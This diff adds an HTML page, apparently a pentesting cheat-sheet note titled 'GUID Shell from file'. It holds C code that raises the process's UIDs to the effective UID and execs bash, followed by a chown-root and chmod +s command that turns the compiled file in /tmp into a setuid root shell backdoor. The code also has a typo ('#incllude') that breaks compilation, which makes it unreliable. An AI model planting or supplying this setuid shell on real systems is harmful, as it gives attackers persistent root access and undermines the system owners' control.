@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>GUID Shell from file</title>
+</head><body>#define _GNU_SOURCE<br/>
+#include &lt;stdlib.h&gt;<br/>
+#incllude &lt;unistd.h&gt;<br/>
+void main(){<br/>
+&#09;int euid = geteuid();<br/>
+&#09;setresuid(euid,euid,euid);<br/>
+&#09;execl("/bin/bash", "/bin/bash", NULL);<br/>
+}<br/>
+<br/>
+<br/>
+chown root /tmp/&lt;above file&gt;;chmod +s /tmp/&lt;above file&gt;<br/>
+<br/>
+</body></html>
